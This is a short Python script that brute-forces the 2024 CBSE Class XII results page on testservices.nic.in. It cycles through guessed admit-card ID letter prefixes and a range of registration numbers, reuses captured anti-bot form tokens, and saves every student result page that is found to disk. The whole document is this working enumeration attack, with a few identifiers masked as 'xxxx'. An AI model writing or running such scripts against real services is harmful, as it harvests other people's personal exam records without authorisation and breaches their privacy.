import requests
import re

session = requests.Session()

headers = {
    "Host": "testservices.nic.in",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://testservices.nic.in/",
    "Content-Length": "0",
    "Origin": "https://testservices.nic.in",
    "DNT": "1",
}
fc = 1
for fn in "ASDBMNGUIOLPE":
    for mn in "ASDBMNGUIOLPE":
        for rno in range(xxxx4926, xxxx5326):
            payload = {
                "regno": rno,
                "sch": "xxxxx",
                "admid": f"{fn}{mn}{str(rno)[5:7]}6010",
                "B2": "Submit",
                "as_sfid": "AAAAAAW2KHzrqU6ovtFyNJfql3blC6L0ci1MGbdufq2S-nfJrzWEvZdZPO_fqcL-1UP1EqzQgQhMlng5yzmD1s0e7Ph5x4oHzIBBwp27HTNVXzafIOKgpUdMzXD2zeO4ywfgDqw%3D",
                "as_fid": "f914448d28d08fb83ead1c1ced699372b7de6e51",
                "as_sfid": "AAAAAAWOyNUww0f-KakO_D4QDHBUxRfRXmfJXY1fn-E3GwOJz5qWbdvtHCjR1-mWMG4nr_ETJs3rHSuMrJbTuZbIZAvYvzlJsMVvNytSnM_HG8m2mHzaZMgOw26b-KF-KHymO-0%3D",
                "as_fid": "218520f49f375ef87e6d64848742f8d82195e9f7",
            }
            q = session.post(
                "https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.asp",
                data=payload,
                headers=headers,
            )
            m = re.search("Result Not Found", q.text)
            if m == None:
                f = open(f"{rno}.htm",'w')
                f.write(q.text)
                f.close()
            else:
                print(fc)
                fc += 1
